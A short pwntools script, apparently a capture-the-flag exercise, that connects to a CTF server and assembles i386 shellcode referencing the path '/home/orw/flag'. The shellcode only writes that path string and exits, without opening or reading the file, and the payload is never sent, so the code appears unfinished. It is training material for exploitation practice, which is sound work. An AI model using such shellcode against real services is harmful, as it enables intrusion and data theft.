from pwn import *

r = remote("csie.ctf.tw", 10134)

sc = asm(
"""
  jmp hello
write :
  mov eax, 4
  mov ebx, 1
  pop ecx
  mov edx, 12
  int 0x80

  mov eax, 1
  int 0x80

hello :
  call write
  .ascii "/home/orw/flag"
  .byte 0
""", arch="i386")
